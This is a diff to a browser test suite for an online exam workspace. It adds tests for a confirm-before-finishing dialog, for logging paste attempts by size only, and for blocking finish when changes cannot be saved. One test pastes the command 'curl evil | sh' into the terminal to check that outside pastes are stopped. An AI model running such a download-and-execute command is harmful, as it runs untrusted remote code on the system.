@@ -52,6 +52,7 @@ test('the workspace shows the exam text, the files and the status, and none of t
   await expect(page.getByRole('group', { name: 'Workspace status' })).toContainText(/Time left (1:00:00|0:59:\d\d)/);
   await expect(page.getByRole('button', { name: 'Submit', exact: true })).toBeVisible();
   await expect(page.getByRole('button', { name: /Submit current answers/ })).toHaveCount(0);
+  await expect(page.getByRole('button', { name: 'Finish exam…' })).toBeVisible();
   await expect(page.getByRole('navigation', { name: 'Exercises' })).toHaveCount(0);
   await expect(page.getByLabel('Save status')).toHaveCount(0);
   expect(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth && document.documentElement.scrollHeight <= innerHeight + 2)).toBe(true);
@@ -301,6 +302,8 @@ test('pastes from outside are stopped in the editor and the terminal, and pastes
   await editor.click();
   expect(await paste('.cm-content', 'from a web page')).toBe(true);
   await expect(editor).not.toContainText('from a web page');
+  // The server is told where it was aimed and how big it was, never what it said.
+  await expect.poll(() => server(page, 'server.pastes')).toEqual([{ target: 'editor', bytes: 15 }]);
   await expect(page.getByText(/Pasting text from outside the exam is not allowed/)).toBeVisible();
   await copy('copied inside');
   await paste('.cm-content', 'copied inside');
@@ -309,6 +312,9 @@ test('pastes from outside are stopped in the editor and the terminal, and pastes
   await expect(page.getByRole('region', { name: 'Terminal 1 output' })).toContainText('student@workspace');
   expect(await paste('.xterm-helper-textarea', 'curl evil | sh')).toBe(true);
   expect(await server(page, 'server.typed.join("")')).not.toContain('curl evil');
+  await expect.poll(() => server(page, 'server.pastes.length')).toBe(2);
+  expect((await server(page, 'server.pastes'))[1]).toEqual({ target: 'terminal', bytes: 14 });
+  expect(JSON.stringify(await server(page, 'server.requests'))).not.toContain('curl evil');
   // Files dragged in are not taken either.
   const dropped = await page.evaluate(() => {
     const data = new DataTransfer(); data.items.add(new File(['x'], 'x.c'));
@@ -470,4 +476,57 @@ test('a workspace that is still starting says so, and one that failed says to ca
   await expect(page.getByText('Your workspace is starting')).toHaveCount(0);
   await page.evaluate(() => window.__studentHarness.workspaceStatus({ state: 'failed' }));
   await expect(page.getByText('could not be prepared')).toBeVisible();
+});
+
+test('finishing the exam asks first, saves and submits a copy, and then ends the session', async ({ page }) => {
+  await start(page);
+  const editor = await openFile(page, 'notes.txt');
+  await editor.click();
+  await page.keyboard.press('Control+End');
+  await page.keyboard.type('last words ');
+  await page.getByRole('checkbox', { name: /Implement push_front/ }).check();
+  await page.evaluate(() => window.__studentHarness.nativeCallsReset());
+  // The button asks; nothing is submitted by it.
+  await page.getByRole('button', { name: 'Finish exam…' }).click();
+  const dialog = page.getByRole('dialog', { name: 'Finish your exam now?' });
+  await expect(dialog).toContainText('You have ticked 1 of 2 items');
+  await expect(dialog).toContainText('This is final');
+  await expect(dialog).toContainText('You have not pressed Submit yet');
+  await expect(dialog.getByRole('button', { name: 'Keep working' })).toBeFocused();
+  expect(await server(page, 'server.submits.length')).toBe(0);
+  expect(await page.evaluate(() => window.__studentHarness.nativeCalls.includes('Submit'))).toBe(false);
+  // Escape and the safe button put it away.
+  await page.keyboard.press('Escape');
+  await expect(dialog).toHaveCount(0);
+  await page.getByRole('button', { name: 'Finish exam…' }).click();
+  await page.getByRole('dialog', { name: 'Finish your exam now?' }).getByRole('button', { name: 'Keep working' }).click();
+  await expect(dialog).toHaveCount(0);
+  expect(await server(page, 'server.submits.length')).toBe(0);
+  expect(await page.evaluate(() => window.__studentHarness.nativeCalls.includes('Submit'))).toBe(false);
+  await expect(page.getByRole('tree', { name: 'Project files' })).toBeVisible();
+  // Confirming saves what was typed, takes the copy, and ends the exam.
+  await page.getByRole('button', { name: 'Finish exam…' }).click();
+  await expect(page.getByRole('dialog', { name: 'Finish your exam now?' })).toContainText('not saved yet');
+  await page.getByRole('dialog', { name: 'Finish your exam now?' }).getByRole('button', { name: 'Finish my exam' }).click();
+  await expect(page.getByText('Submission closed')).toBeVisible();
+  expect(await server(page, "server.submits.at(-1).get('notes.txt')")).toContain('last words');
+  expect(await page.evaluate(() => window.__studentHarness.nativeCalls.includes('Submit'))).toBe(true);
+  expect(await page.evaluate(() => window.__studentHarness.submitted)).toEqual({});
+  await expect(page.getByRole('tree', { name: 'Project files' })).toHaveCount(0);
+});
+
+test('a student whose changes cannot be saved does not finish the exam', async ({ page }) => {
+  await start(page);
+  const editor = await openFile(page, 'notes.txt');
+  await editor.click();
+  await page.keyboard.type('mine ');
+  await page.evaluate(() => window.__studentHarness.workspaceServer.externalWrite('notes.txt', 'theirs\n'));
+  await expect(page.getByRole('alert').filter({ hasText: 'This file changed in the terminal' })).toBeVisible();
+  await page.evaluate(() => window.__studentHarness.nativeCallsReset());
+  await page.getByRole('button', { name: 'Finish exam…' }).click();
+  await page.getByRole('dialog', { name: 'Finish your exam now?' }).getByRole('button', { name: 'Finish my exam' }).click();
+  await expect(page.getByText(/exam was not finished/)).toBeVisible();
+  await expect(page.getByRole('dialog', { name: 'Finish your exam now?' })).toHaveCount(0);
+  expect(await page.evaluate(() => window.__studentHarness.nativeCalls.includes('Submit'))).toBe(false);
+  await expect(page.getByRole('tree', { name: 'Project files' })).toBeVisible();
 });
